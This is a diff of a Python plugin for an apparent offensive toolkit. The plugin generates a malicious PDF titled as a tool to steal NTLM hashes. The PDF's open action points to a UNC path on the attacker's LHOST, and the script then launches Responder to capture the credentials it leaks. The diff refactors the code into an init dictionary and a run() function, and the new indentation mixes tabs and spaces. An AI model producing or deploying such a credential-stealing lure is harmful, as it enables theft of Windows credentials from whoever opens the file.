@@ -1,6 +1,12 @@
 Description = 'Steal the NTLM hash using malicious PDF file'
 from plugin_support import *
 
+init = {
+	# NAME    VALUE
+	'interface':ask.interface,
+	'LHOST':ask.LHOST
+}
+
 evil_code = """
 %PDF-1.7
 1 0 obj
@@ -27,7 +33,7 @@ startxref
    /Contents 4 0 R
    /AA <<
 	   /O <<
-	      /F (\\\\\\\\""" + ask.LHOST + """\\\\test)
+	      /F (\\\\\\\\""" + init['LHOST'] + """\\\\test)
 		  /D [ 0 /Fit]
 		  /S /GoToE
 		  >>
@@ -60,13 +66,14 @@ trailer
 >>
 %%EOF
 """
-try:
-    text("Creating PDF...")
-    pdf = open("EvilPDF_Exec.pdf", "w")
-    pdf.write(evil_code)
-    pdf.close()
-    text("Saved as: EvilPDF_Exec.pdf")
-    text("Starting up responder to get hashes")
-    os.system("/usr/bin/responder -I " + ask.interface + " -wF")
-except KeyboardInterrupt:
-    exit()
+def run():
+	try:
+    	text("Creating PDF...")
+    	pdf = open("EvilPDF_Exec.pdf", "w")
+		pdf.write(evil_code)
+    	pdf.close()
+    	text("Saved as: EvilPDF_Exec.pdf")
+    	text("Starting up responder to get hashes")
+    	os.system("/usr/bin/responder -I " + init['interface'] + " -wF")
+	except KeyboardInterrupt:
+    	exit()
